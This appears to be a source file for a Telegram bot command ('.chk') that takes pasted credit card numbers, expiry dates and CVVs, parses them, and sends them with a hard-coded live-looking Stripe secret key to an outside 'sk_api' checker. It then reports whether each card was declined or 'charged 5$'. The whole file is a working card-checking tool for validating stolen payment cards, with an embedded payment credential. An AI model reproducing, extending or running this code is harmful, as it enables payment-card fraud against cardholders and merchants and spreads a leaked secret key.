from EQUROBOT import app
import requests
import re
from pyrogram import filters

@app.on_message(filters.command("chk", prefixes=[".", "/"]))
async def check_cc(_, message):
    command_prefix_length = len(message.text.split()[0])
    cc = message.text[command_prefix_length:].strip()
    
    reply_msg = message.reply_to_message
    if reply_msg:
        cc_in_backticks = re.findall(r'`([^`]*)`', reply_msg.text)
        if cc_in_backticks:
            cc = cc_in_backticks[0].strip()
        else:
            cc = reply_msg.text.strip()

    cards = extract_credit_card_details(cc)
    
    if not cards:
        return await message.reply_text('Invalid CC format or details.')

    ccn, mm, yy, cvv = cards[0]

    if not (len(ccn) in [13, 15, 16] and len(mm) == 2 and len(yy) in [2, 4] and len(cvv) in [3, 4]):
        return await message.reply_text('Invalid CC details. Check the format and values.')

    VALID_PREFIXES = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
    if not ccn.startswith(VALID_PREFIXES):
        return await message.reply_text('Invalid CC type')

    reply = await message.reply_text('Processing your request...')

    url = "https://mvy.ai/sk_api/api.php"
    params = {
        "lista": f"{ccn}:{mm}:{yy}:{cvv}",
        "sk": "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"
    }

    try:
        r = requests.get(url, params=params)
        r.raise_for_status()
        response = r.json()
    except requests.exceptions.RequestException as e:
        return await reply.edit_text(f"Error during request: {e}")
    except ValueError:
        return await reply.edit_text("Invalid response from the API.")

    fullcc = f"{ccn}|{mm}|{yy}|{cvv}"

    if response['status'] == 'die':
        die_message = (
            f"┏━━━━━━━⍟\n"
            f"┃DECLINED ❌\n"
            f"┗━━━━━━━━━━━⊛\n"
            f"➩ 𝗖𝗮𝗿𝗱 : `{fullcc}`\n"
            f"➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : **{response['message']}**\n\n"
            f"[↯] 𝗣𝗿𝗼𝘅𝘆 ↳ 104.207.45.101:xxx Live ✅\n"
            f"➩ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 : {message.from_user.mention}\n"
        )
        await reply.edit_text(die_message)

    elif response['status'] == 'approved':
        approved_message = (
            f"┏━━━━━━━⍟\n"
            f"┃BRAINTREE AUTH 𝟓$ ✅\n"
            f"┗━━━━━━━━━━━⊛\n"
            f"➩ 𝗖𝗮𝗿𝗱 : `{fullcc}`\n"
            f"➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : APPROVED CARD ✅\n"
            f"➩ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : CHARGED 5$\n\n"
            f"[↯] 𝗣𝗿𝗼𝘅𝘆 ↳ 104.207.45.101:xxx Live ✅\n"
            f"➩ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 : {message.from_user.mention}\n"
        )
        await reply.edit_text(approved_message)

    else:
        await reply.edit_text(f"Unknown status received: {response.get('status')}")

def extract_credit_card_details(message_text):
    cards = []
    input = re.findall(r"[0-9]+", message_text)
    
    if not input or len(input) < 3:
        return cards
    
    if len(input) == 3:
        cc = input[0]
        if len(input[1]) == 3:
            mes = input[2][:2]
            ano = input[2][2:]
            cvv = input[1]
        else:
            mes = input[1][:2]
            ano = input[1][2:]
            cvv = input[2]
    else:
        cc = input[0]
        if len(input[1]) == 3:
            mes = input[2]
            ano = input[3]
            cvv = input[1]
        else:
            mes = input[1]
            ano = input[2]
            cvv = input[3]

    if len(mes) != 2 or not (1 <= int(mes) <= 12):
        return cards

    if len(cvv) not in [3, 4]:
        return cards

    cards.append([cc, mes, ano, cvv])
    return cards
